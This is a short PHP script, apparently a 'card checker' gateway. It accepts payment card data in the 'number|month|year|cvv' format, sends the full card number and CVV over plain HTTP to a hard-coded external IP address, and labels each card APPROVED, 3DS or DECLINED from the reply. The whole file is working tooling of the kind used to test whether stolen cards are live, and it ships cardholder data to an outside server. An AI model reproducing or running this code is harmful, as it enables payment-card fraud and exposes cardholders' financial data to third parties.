<?php
// Auth Checker Gateway
// Calls the external API at port 5005

header('Content-Type: text/plain');

$card = $_POST['cc'] ?? $_GET['cc'] ?? '';

if (empty($card)) {
    echo "ERROR: No card provided";
    exit;
}

// Parse card format (cc|mm|yy|cvv)
$parts = explode('|', $card);
if (count($parts) < 4) {
    echo "DECLINED: Invalid card format. Use: number|month|year|cvv";
    exit;
}

list($cardNumber, $month, $year, $cvv) = $parts;

// Format month as integer (remove leading zeros)
$month = intval($month);

// Format year (if 2-digit, convert to 4-digit)
if (strlen($year) == 2) {
    $year = 2000 + intval($year);
}

// Prepare data for external API
$postData = json_encode([
    'cc' => "{$cardNumber}|{$month}|{$year}|{$cvv}"
]);

// Call the external auth checker API
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://185.227.111.153:5005/check');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 200) {
    echo "DECLINED: API connection failed (HTTP $httpCode)";
    exit;
}

$result = json_decode($response, true);

if ($result && isset($result['status'])) {
    $status = strtoupper($result['status']);
    $message = $result['message'] ?? '';
    
    if ($status === 'LIVE' || $status === 'APPROVED') {
        echo "APPROVED: " . $message;
    } elseif ($status === '3DS' || strpos($message, '3DS') !== false) {
        echo "3DS: " . $message;
    } else {
        echo "DECLINED: " . $message;
    }
} else {
    echo "DECLINED: Invalid response from checker";
}
?>
